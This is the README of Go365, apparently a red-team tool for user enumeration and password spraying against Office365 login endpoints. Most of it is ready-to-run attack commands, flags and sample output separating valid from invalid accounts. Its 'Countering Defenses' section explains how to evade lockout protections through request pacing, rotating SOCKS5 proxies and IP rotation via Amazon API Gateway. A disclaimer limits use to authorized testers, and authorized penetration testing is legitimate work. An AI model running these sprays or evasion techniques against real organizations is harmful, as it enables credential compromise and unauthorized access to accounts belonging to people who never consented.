# Go365 v1.4

Dec 6 2021 - Noticed that the AWS gateway option wasn't working properly in this last release. On my list to fix it! Busy season, so give me a couple weeks please :P  -- paveway3



**Please read all of this README before using Go365!**

Go365 is a tool designed to perform user enumeration* and password guessing attacks on organizations that use Office365 (now/soon Microsoft365). Go365 uses a unique SOAP API endpoint on login.microsoftonline.com that most other tools do not use. When queried with an email address and password, the endpoint responds with an Azure AD Authentication and Authorization code. This code is then processed by Go365 and the result is printed to screen or an output file.

\* User enumeration is performed in conjunction with a password guess attempt. Thus, there is no specific flag or funtionality to perform only user enumeration. Instead, conduct your first password guessing attack, then parse the results for valid users.

##### Read these three bullets!

- This tool might not work on **all** domains that utilize o365. Tests show that it works with most federated domains. Some domains will only report valid users even if a valid password is also provided. Your results may vary!
- The domains this tool was tested on showed that it did not actually lock out accounts after multiple password failures. Your results may vary!
- This tool is intended to be used by security professionals that are authorized to "attack" the target organization's o365 instance.

## Obtaining

#### Option 0

```
go get -u github.com/optiv/Go365
```

#### Option 1

Download a pre-compiled binary for your OS [HERE](https://github.com/optiv/Go365/releases).

#### Option 2

Download the source and compile locally.

1. Install Go.
2. Go get some packages:

```
go get github.com/beevik/etree
go get github.com/fatih/color
go get golang.org/x/net/proxy
```

3. Clone the repo.
4. Navigate to the repo and compile ya dingus.

```
go build Go365.go
```

5. Run the resulting binary and enjoy :)

## Usage

```
$ ./Go365 -h

  ██████         ██████   ██████  ██████
 ██                   ██ ██       ██
 ██  ███   ████   █████  ███████  ██████
 ██    ██ ██  ██      ██ ██    ██      ██
  ██████   ████  ██████   ██████  ██████

 Version: 1.4
 Authors: h0useh3ad, paveway3, S4R1N, EatonChips

Usage:

  -h                            Shows this stuff

  Required - Endpoint:

    -endpoint [rst or graph]    Specify which endpoint to use
                                : (-endpoint rst)   login.microsoftonline.com/rst2.srf. SOAP XML request with XML response
                                : (-endpoint graph)  login.microsoft.com/common/oauth2/token. HTTP POST request with JSON Response

  Required - Usernames and Passwords:

    -u <string>                 Single username to test
                                : Username with or without "@domain.com"
                                : Must also provide -d flag to specify the domain
                                : (-u legit.user)

    -ul <file>                  Username list to use (overrides -u)
                                : File should contain one username per line
                                : Usernames can have "@domain.com"
                                : If no domain is specified, the -d domain is used
                                : (-ul ./usernamelist.txt)

    -p <string>                 Password to attempt
                                : Enclose in single quotes if it contains special characters
                                : (-p password123)  or  (-p 'p@s$w0|2d')

    -pl <file>                  Password list to use (overrides -p)
                                : File should contain one password per line
                                : -delay flag can be used to include a pause between each set of attempts
                                : (-pl ./passwordlist.txt)

    -up <file>                  Userpass list to use (overrides all the above options)
                                : One username and password separated by a ":" per line
                                : Be careful of duplicate usernames!
                                : (-up ./userpasslist.txt)

  Required/Optional - Domain:

    -d <string>                 Domain to test
                                : Use this if the username or username list does not include "@targetcompany.com"
                                : (-d targetcompany.com)

  Optional:

    -w <int>                    Time to wait between attempts in seconds.
                                : Default: 1 second. 5 seconds recommended.
                                : (-w 10)

    -delay <int>                Delay (in seconds) between sprays when using a password list.
                                : Default: 60 minutes (3600 seconds) recommended.
                                : (-delay 7200)

    -o <string>                 Output file to write to
                                : Will append if file exists, otherwise a file is created
                                : (-o ./Go365output.out)

    -proxy <string>             Single proxy server to use
                                : IP address and Port separated by a ":"
                                : Has only been tested using SSH SOCKS5 proxies
                                : (-proxy 127.0.0.1:1080)

    -proxyfile <string>         A file with a list of proxy servers to use
                                : IP address and Port separated by a ":" on each line
                                : Randomly selects a proxy server to use before each request
                                : Has only been tested using SSH SOCKS5 proxies
                                : (-proxyfile ./proxyfile.txt)

    -url <string>               Endpoint to send requests to
                                : Amazon API Gateway 'Invoke URL'
                                : Highly recommended that you use this option.
                                : (-url https://kg98agrae3.execute-api.us-east-2.amazonaws.com/login)

    -debug                      Debug mode.
                                : Print xml response
```

### Examples

```
./Go365 -endpoint rst -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com
./Go365 -endpoint graph -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5
./Go365 -endpoint rst -up ./userpass_list.txt -delay 3600 -d pwnthisfakedomain.com -w 5 -o Go365output.txt
./Go365 -endpoint graph -u legituser -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxy 127.0.0.1:1080
./Go365 -endpoint rst -u legituser -pl ./pass_list.txt -delay 1800 -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxyfile ./proxyfile.txt
./Go365 -endpoint graph -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -url https://k62g98dne3.execute-api.us-east-2.amazonaws.com/login 
```

## Account Locked Out! (Domain Defenses)

**protip:** _You probably aren't **actually** locking out accounts._

After a number of queries against a target domain, results might start reporting that accounts are locked out.

Once this defense is triggered, **user enumeration becomes unreliable since requests for valid and invalid users will randomly report that their accounts have been locked out**.

```
...
[-] User not found: test.user90@pwnthisfakedomain.com
[-] User not found: test.user91@pwnthisfakedomain.com
[-] Valid user, but invalid password: test.user92@pwnthisfakedomain.com
[!] Account Locked Out: real.user1@pwnthisfakedomain.com
[-] Valid user, but invalid password: test.user93@pwnthisfakedomain.com
[!] Account Locked Out: valid.user94@pwnthisfakedomain.com
[!] Account Locked Out: jane.smith@pwnthisfakedomain.com
[-] Valid user, but invalid password: real.user95@pwnthisfakedomain.com
[-] Valid user, but invalid password: fake.user96@pwnthisfakedomain.com
[!] Account Locked Out: valid.smith@pwnthisfakedomain.com
...
```

This is a defensive mechanism triggered by the number of **valid** user queries against the target domain within a certain period of **time**. The number of attempts and the period of time will vary depending on the target domain since the thresholds can be customized by the target organization.

### Countering Defenses

#### Wait time

The defensive mechanism is **time** and **IP address** based. Go365 provides options to include a wait time between requests and proxy options to distribute the source of the requests. To circumvent the defensive mechanisms on your target domain, use a long wait time and multiple proxy servers.

A wait time of AT LEAST 15 seconds is recommended. `-w 15`

#### SOCKS5 Proxies

If you still get "account locked out" responses, start proxying your requests. Proxy options have only been tested on SSH SOCKS5 dynamic proxies (`ssh -D <port> user@proxyserver`)

Create a bunch of SOCKS5 proxies on DO or AWS or Vultr or whatever and make a file that looks like this:

```
127.0.0.1:8081
127.0.0.1:8082
127.0.0.1:8083
127.0.0.1:8084
127.0.0.1:8085
127.0.0.1:8086
...
```

The tool will randomly iterate through the provided proxy servers and wait for the specified amount of time between requests.

`-w 15 -proxyfile ./proxies.txt`

#### Amazon API Gateway

Additionally, an endpoint url may be specified so this tool can interface with Amazon API Gateway. Setup a gateway to point to the `https://login.microsoftonline.com/rst2.srf` endpoint, then set the -url parameter to the provided `Invoke URL`. Your IP should be rotated with each request.

`-url https://k62g98dne3.execute-api.us-east-2.amazonaws.com/login`
